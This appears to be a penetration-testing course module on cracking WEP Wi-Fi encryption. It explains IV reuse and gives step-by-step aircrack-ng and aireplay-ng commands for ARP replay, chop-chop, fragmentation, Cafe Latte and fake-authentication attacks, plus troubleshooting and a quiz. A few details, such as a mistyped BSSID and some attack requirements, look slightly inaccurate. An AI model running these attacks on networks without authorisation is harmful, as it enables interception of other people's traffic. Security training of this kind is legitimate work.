# Module 05 — WEP Cracking

> **Prerequisites:** [Module 04 — Packet Analysis with Wireshark & Scapy](../module-04-packet-analysis/)
> **Next Module:** [Module 06 — Capturing the WPA2 4-Way Handshake](../module-06-wpa2-handshake/)

---

## Table of Contents

1. [Why WEP is Still Relevant](#1-why-wep-is-still-relevant)
2. [WEP Encryption Fundamentals](#2-wep-encryption-fundamentals)
3. [WEP Weaknesses: Initialization Vectors (IV)](#3-wep-weaknesses-initialization-vectors-iv)
4. [Cracking Methods Overview](#4-cracking-methods-overview)
5. [Method 1: Passive Packet Capture](#5-method-1-passive-packet-capture)
6. [Method 2: ARP Replay Attack](#6-method-2-arp-replay-attack)
7. [Method 3: Chop-Chop Attack](#7-method-3-chop-chop-attack)
8. [Method 4: Fragmentation Attack](#8-method-4-fragmentation-attack)
9. [Method 5: Cafe Latte Attack](#9-method-5-cafe-latte-attack)
10. [KoreK and PTW Attacks](#10-korek-and-ptw-attacks)
11. [Advanced: Fake Authentication](#11-advanced-fake-authentication)
12. [Troubleshooting Common Issues](#12-troubleshooting-common-issues)
13. [Knowledge Check](#13-knowledge-check)

---

## 1. Why WEP is Still Relevant

While WPA2/WPA3 are the current standards, **WEP is still encountered in the wild** because:

- Legacy hardware that cannot be upgraded
- Misconfigured or lazy network administrators
- IoT devices with limited processing power
- Honeypots and capture-the-flag competitions
- Some embedded systems and SCADA equipment

**WEP can be cracked in minutes** with enough traffic, making it an important skill for penetration testers.

---

## 2. WEP Encryption Fundamentals

### RC4 Stream Cipher

WEP uses the **RC4** stream cipher for encryption:

```
Encryption Process:
1. 24-bit Initialization Vector (IV) is generated
2. IV + Secret Key → RC4 Key Schedule → Keystream
3. Plaintext XOR Keystream → Ciphertext
4. IV is prepended to ciphertext and transmitted

Decryption Process:
1. Extract IV from packet
2. IV + Secret Key → RC4 Key Schedule → Keystream
3. Ciphertext XOR Keystream → Plaintext
```

### WEP Key Structure

```
64-bit WEP:  24-bit IV + 40-bit key   = "64-bit" (but only 40 bits of actual key)
128-bit WEP: 24-bit IV + 104-bit key  = "128-bit" (but only 104 bits of actual key)
```

The secret key is configured on the AP and must be known (or cracked) to decrypt traffic.

---

## 3. WEP Weaknesses: Initialization Vectors (IV)

### The Core Problem: IV Reuse

WEP's critical flaw is that **the 24-bit IV is too small** and can repeat:

- With 24 bits, there are only **16,777,216 possible IVs**
- In active traffic, IVs can repeat within hours or even minutes
- When the same IV is used with the same key, the **keystream is identical**
- This allows statistical attacks to recover the keystream

### Attack-Friendly Properties

1. **IV is transmitted in clear** — Attackers can collect IVs easily
2. **No key mixing function** — Original RC4 key = IV + secret key
3. **CRC-32 for integrity** — Linearly weak, can be manipulated
4. **Known plaintext attacks** — Parts of frames are predictable (headers, LLC/SNAP)

---

## 4. Cracking Methods Overview

| Method | Speed | Requirements | Packet Count |
|--------|-------|--------------|--------------|
| Passive capture | Slow | Monitor mode | ~100,000-1,000,000 |
| ARP Replay | Fast | Associated client | ~20,000-50,000 |
| Chop-Chop | Medium | Fragmented traffic | ~15,000 |
| Fragmentation | Fast | None | ~15,000 |
| Cafe Latte | Medium | Client on network | ~10,000 |

---

## 5. Method 1: Passive Packet Capture

The simplest method — just capture enough encrypted traffic and analyze IVs.

### Step-by-Step

```bash
# 1. Enable monitor mode
sudo airmon-ng start wlan0

# 2. Target a specific WEP network
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w wep_capture wlan0mon
```

Wait for 100,000+ IVs (this can take hours depending on traffic).

### Cracking

```bash
# Using aircrack-ng (FMS/KoreK attack by default)
sudo aircrack-ng wep_capture-01.cap

# Or use PTW attack (faster, requires data packets)
sudo aircrack-ng -z wep_capture-01.cap
```

The `PTW` method (-z) is faster but requires ARP packets in the capture.

---

## 6. Method 2: ARP Replay Attack

This is the **most reliable and fastest** WEP cracking method.

### How It Works

1. Wait for an ARP packet from a client
2. Capture and replay it (inject it back into the network)
3. Each replay generates a new IV (but the plaintext is known)
4. Collect IVs rapidly — can crack in minutes

### Execution

```bash
# 1. Capture in background
sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w wep_capture wlan0mon

# 2. In another terminal, start ARP replay attack
sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# -b = target BSSID
# -h = your MAC (or client MAC if you're using fake auth)
```

**If no clients are connected:**

```bash
# Use fake authentication first to get a MAC
sudo aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon
# Then run ARP replay with your authenticated MAC
sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon
```

### Verification

Watch the "#Data" column in airodump-ng — it should increase rapidly (hundreds per second).

---

## 7. Method 3: Chop-Chop Attack

The **Chop-Chop attack** exploits CRC-32 weaknesses to decrypt packets without knowing the key.

### When to Use

- No ARP packets available
- Limited traffic on the network
- Client is sending small, fragmented packets

### Execution

```bash
# 1. Target a specific packet in airodump-ng output
# Look for packets with specific length

# 2. Start chop-chop attack
sudo aireplay-ng --chopchop -b AA:BB:CC:DD:EE:FF -m 68 -n 68 wlan0mon

# -b = target BSSID
# -m = minimum packet length
# -n = maximum packet length
```

This attack:
1. Intercepts a data packet
2. Guesses the last byte of the plaintext by modifying the packet and checking if AP accepts it
3. Continues until the entire packet is decrypted
4. Produces a plaintext file you can use to generate new encrypted packets

---

## 8. Method 4: Fragmentation Attack

Similar to Chop-Chop but **faster** — exploits the fact that AP responds to fragmented packets.

### Execution

```bash
# 1. Start fragmentation attack
sudo aireplay-ng --fragment -b AA:BB:BB:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# -b = target BSSID
# -h = your MAC (must be authenticated)
```

The attack:
1. Gets a small amount of keystream from the AP (128 bytes)
2. Can then forge new encrypted packets
3. Much faster than Chop-Chop

### Prerequisites

You need to be **authenticated** to the AP:

```bash
sudo aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon
```

---

## 9. Method 5: Cafe Latte Attack

The **Cafe Latte attack** allows cracking WEP from a client, without access to the AP.

### How It Works

1. Client sends an ARP request
2. You capture and modify it
3. Client responds with encrypted ARP reply
4. This generates new IVs that can be analyzed
5. Repeat until you have enough IVs

### Execution

```bash
# From the client side (not AP side)
sudo aireplay-ng --caffe-latte -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon
```

This is useful when:
- You're on the same network as clients but not near the AP
- You can't inject into the AP from your position
- You want to attack from a client perspective

---

## 10. KoreK and PTW Attacks

### FMS/KoreK Attack (Statistical)

The **FMS (Fluhrer, Mantin, Shamir)** and **KoreK** attacks exploit RC4 key schedule weaknesses:

```bash
# Default attack (tries multiple methods)
sudo aircrack-ng wep_capture-01.cap

# Specify wordlist if key is not standard
sudo aircrack-ng -w wordlist.txt wep_capture-01.cap
```

### PTW Attack (2007)

The **PTW (Pyshkin, Tews, Weinmann)** attack is faster and more effective:

```bash
# PTW attack
sudo aircrack-ng -z wep_capture-01.cap
```

**Requirements for PTW:**
- ARP packets must be present in the capture
- Works with fewer IVs than KoreK

---

## 11. Advanced: Fake Authentication

Sometimes you need to **associate with the AP** before injecting.

### When Needed

- No clients are connected
- You're too far from clients
- Chop-Chop or Fragmentation attacks require it

### Execution

```bash
# Successful fake authentication
sudo aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# Output looks like:
# 12:00:00 Sending Authentication Request
# 12:00:00 Authentication successful!
# 12:00:00 Sending Association Request
# 12:00:00 Association successful :-)
```

### Troubleshooting

If authentication fails:
- **"OFL"** (Out of Frame Limit) — Wait for more beacons
- **"Wrong ESSID"** — Check you're targeting the right AP
- **"Denied (code 10)"** — AP may have MAC filtering enabled

---

## 12. Troubleshooting Common Issues

### Problem: No IVs being collected

**Cause:** Not on the right channel

```bash
sudo iw dev wlan0mon set channel 6
```

### Problem: ARP replay shows 0 ARP

**Cause:** No ARP packets on the network

**Solution:**
- Wait for a client to generate ARP traffic
- Use Chop-Chop or Fragmentation instead
- Use Cafe Latte attack from client side

### Problem: "No data found in config file"

**Cause:** No data packets captured

**Solution:**
- Wait longer for traffic
- Use deauth to trigger reconnection (creates traffic)
- Use Chop-Chop to generate traffic

### Problem: Cracking takes forever

**Solution:**
- Ensure you're using ARP replay (fastest)
- Use PTW attack: `aircrack-ng -z`
- Check that you have enough IVs (minimum ~20,000 for PTW)

---

## 13. Knowledge Check

Before proceeding to Module 06, you should be able to:

1. What is the size of the Initialization Vector (IV) in WEP, and why is this a problem?
2. Explain the difference between a 64-bit WEP key and a 128-bit WEP key in terms of actual key strength.
3. What is the most reliable and fastest method for cracking WEP? Describe the attack process.
4. Write the command to start an ARP replay attack against a WEP network with BSSID AA:BB:CC:DD:EE:FF.
5. What does the PTW attack (-z flag) require in order to work effectively?
6. Why might you need to perform fake authentication before certain WEP attacks?
7. Describe the Cafe Latte attack and in what scenario it would be useful.
8. What is the difference between the Chop-Chop attack and the Fragmentation attack?
9. How can you verify that an ARP replay attack is working (what should you see in airodump-ng)?
10. If an AP has no connected clients and minimal traffic, which WEP cracking method would be most appropriate?

---

**Next:** [Module 06 — Capturing the WPA2 4-Way Handshake](../module-06-wpa2-handshake/)
